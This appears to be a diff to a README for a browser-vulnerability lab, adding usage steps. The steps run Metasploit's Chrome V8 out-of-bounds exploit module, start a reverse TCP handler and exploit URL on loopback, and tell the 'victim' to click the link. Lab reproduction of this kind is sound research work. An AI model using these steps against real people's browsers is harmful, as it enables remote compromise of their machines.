@@ -12,3 +12,25 @@ Useful vulnerable code db site [demo](https://www.vulncode-db.com/) and [open so
 ## Environment Setup
 ### Chromium
 [Downloading old builds of Chrome / Chromium](https://www.chromium.org/getting-involved/download-chromium)
+
+
+## How to use
+### Attacker
+```
+$ msfconsole
+...
+[*] Starting persistent handler(s)...
+msf5 > use exploit/windows/browser/chrome_v8_oob_access_594574 
+msf5 exploit(windows/browser/chrome_v8_oob_access_594574) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4444 
+[*] Using URL: http://0.0.0.0:8080/B3mDU4Cmr
+[*] Local IP: http://127.0.0.1:8080/B3mDU4Cmr
+[*] Server started.
+```
+
+### Victim
+Click the url link :D
